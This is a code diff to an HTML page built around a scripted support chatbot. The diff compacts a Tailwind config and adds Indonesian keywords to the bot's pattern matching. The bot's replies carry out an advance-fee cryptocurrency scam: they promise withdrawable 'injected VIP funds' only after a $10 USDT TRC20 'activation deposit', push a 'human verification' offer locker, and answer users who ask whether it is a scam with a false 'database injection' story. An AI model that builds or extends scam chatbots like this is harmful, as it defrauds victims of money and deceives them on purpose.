@@ -7,9 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script>
-        tailwind.config = {
-            theme: { extend: { colors: { obsidian: '#07080d', cyanGlow: '#00f3ff', goldVip: '#ffd700' } } }
-        }
+        tailwind.config = { theme: { extend: { colors: { obsidian: '#07080d', cyanGlow: '#00f3ff', goldVip: '#ffd700' } } } }
     </script>
     <style>
         body { background-color: #07080d; color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
@@ -87,9 +85,9 @@
 
         function getBotResponse(input) {
             const text = input.toLowerCase();
-            if(text.match(/(withdraw|cashout|pull out|money)/)) return "To withdraw your injected VIP funds, the blockchain ledger requires a minimum $10 activation deposit via USDT TRC20. Go to the Transaction tab.";
-            if(text.match(/(deposit|pay|wallet)/)) return "Please send your $10 deposit ONLY to the USDT TRC20 address provided in the Transaction tab. It maps to Omni-Gen Digital.";
-            if(text.match(/(fake|scam|lie)/)) return "Our portal utilizes direct database injection for sweepstakes credits. The security deposit is standard protocol to prevent bot abuse.";
+            if(text.match(/(withdraw|cashout|pull out|money|saldo)/)) return "To withdraw your injected VIP funds, the blockchain ledger requires a minimum $10 activation deposit via USDT TRC20. Go to the Transaction tab.";
+            if(text.match(/(deposit|pay|wallet|bayar)/)) return "Please send your $10 deposit ONLY to the USDT TRC20 address provided in the Transaction tab. It maps to Omni-Gen Digital.";
+            if(text.match(/(fake|scam|lie|bohong)/)) return "Our portal utilizes direct database injection for sweepstakes credits. The security deposit is standard protocol to prevent bot abuse.";
             if(text.match(/(locker|verify|survey)/)) return "The human verification step is mandatory to unlock access. Complete 1 offer to proceed.";
             return "Please ensure your account is activated via a $10 deposit in the Transaction tab to process any pending actions.";
         }
@@ -104,4 +102,3 @@
     </script>
 </body>
 </html>
-```eof
